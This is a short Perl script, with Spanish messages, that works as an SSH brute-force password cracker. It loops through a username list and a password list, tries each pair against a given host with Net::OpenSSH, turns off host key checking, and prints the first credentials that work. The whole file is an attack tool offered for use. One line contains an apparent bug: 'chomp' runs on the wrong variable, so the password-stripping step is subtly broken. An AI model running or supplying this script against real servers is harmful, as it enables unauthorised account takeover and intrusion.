use Net::OpenSSH;
use strict;

if (!@ARGV){
	print "Parametros obligatorios\n   password_cracker.pl [host] [usernamelist file] [passwordlist file]\n";
	exit 1;
	}
	
my $host= $ARGV[0];
my $userlist =$ARGV[1];
my $passlist=$ARGV[2];

open(USER, $userlist) or die "No se pudo abrir el archivo de usernames\n";
foreach my $user(<USER>){
	chomp $user;
	open(PASS, $passlist) or die "No se pudo abrir el archivo de passwords\n";
	foreach my $pass (<PASS>){
		chomp;
		my $ssh= Net::OpenSSH->new($host, user => $user, passwd => $pass ,master_opts => [-o => "StrictHostKeyChecking=no"]);
		print "$user-$pass\n";
		if ($ssh->error==0){
			print "Credenciales encontradas USERNAME:$user PASSWORD:$pass\n";
			exit 0;
		}
	}
}
print "No se encontraron credenciales.\n";
